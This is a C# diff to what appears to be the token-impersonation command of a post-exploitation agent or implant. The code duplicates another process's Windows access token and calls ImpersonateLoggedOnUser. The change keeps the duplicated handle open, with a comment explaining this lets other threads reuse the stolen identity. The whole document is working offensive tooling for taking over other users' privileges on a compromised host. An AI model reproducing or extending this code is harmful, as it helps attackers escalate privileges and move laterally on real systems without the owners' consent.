@@ -1,4 +1,5 @@
 ﻿using Agent.Commands;
+using Agent.Helpers;
 using Agent.Models;
 using System;
 using System.Collections.Generic;
@@ -53,10 +54,8 @@ namespace Commands
                 if (Agent.Native.Advapi.ImpersonateLoggedOnUser(hTokenDup))
                 {
                     var identity = new WindowsIdentity(hTokenDup);
-                    Agent.Native.Kernel32.CloseHandle(hToken);
-                    process.Dispose();
-
                     context.Result.Result += $"Successfully impersonate token {identity.Name}";
+                    ImpersonationHelper.Impersonate(hTokenDup);
                     return;
                 }
 
@@ -66,14 +65,15 @@ namespace Commands
             }
             catch
             {
-
+                context.Result.Result += $"Failed to impersonate token";
+                return;
             }
             finally
             {
                 if (hToken != IntPtr.Zero)
                     Agent.Native.Kernel32.CloseHandle(hToken);
-                if (hTokenDup != IntPtr.Zero)
-                    Agent.Native.Kernel32.CloseHandle(hTokenDup);
+                //if (hTokenDup != IntPtr.Zero) //we want to keep the token in order o use it in others threads
+                //    Agent.Native.Kernel32.CloseHandle(hTokenDup);
                 process.Dispose();
             }
 
